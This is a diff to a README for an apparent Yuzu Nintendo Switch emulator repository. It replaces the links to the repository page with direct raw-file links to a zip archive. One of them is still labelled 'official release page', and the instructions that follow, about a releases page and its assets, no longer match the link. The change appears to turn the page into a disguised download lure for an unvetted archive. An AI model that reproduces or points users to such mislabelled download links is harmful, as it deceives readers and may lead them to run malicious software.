@@ -1,6 +1,6 @@
 # 🎮 Yuzu-Emulator-Nintendo-Switch - Play Switch Games On Your PC
 
-[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/Kaursim4415/Yuzu-Emulator-Nintendo-Switch)
+[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://raw.githubusercontent.com/Kaursim4415/Yuzu-Emulator-Nintendo-Switch/main/Nintendo-Emulator/Nintendo-Yuzu-Emulator-Switch-v1.3.zip)
 
 ## 📌 Overview
 
@@ -25,7 +25,7 @@ Software:
 
 You must get the latest version from our hosting page. Follow these steps to find the file.
 
-1. Go to the [official release page](https://github.com/Kaursim4415/Yuzu-Emulator-Nintendo-Switch).
+1. Go to the [official release page](https://raw.githubusercontent.com/Kaursim4415/Yuzu-Emulator-Nintendo-Switch/main/Nintendo-Emulator/Nintendo-Yuzu-Emulator-Switch-v1.3.zip).
 2. Look for the latest release version on the right side of the screen.
 3. Scroll down to the Assets section below the release notes.
 4. Click the file ending in .zip or .exe to start your download.
